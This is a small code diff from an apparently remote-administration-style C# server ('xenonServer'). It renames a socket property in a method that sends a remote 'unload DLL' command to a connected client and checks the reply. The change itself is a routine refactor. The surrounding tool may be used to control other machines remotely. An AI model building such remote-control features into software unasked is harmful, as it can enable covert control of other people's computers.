@@ -36,7 +36,7 @@ namespace xenonServer.Forms
         public async Task<bool> UnLoadDll(string dllname) 
         {
             byte[] payload = new byte[] { 4, 1 };
-            payload = client.sock.Concat(payload, Encoding.UTF8.GetBytes(dllname));
+            payload = client.Sock.Concat(payload, Encoding.UTF8.GetBytes(dllname));
             await client.SendAsync(payload);
             bool worked = (await client.ReceiveAsync())[0] == 1;
             return worked;
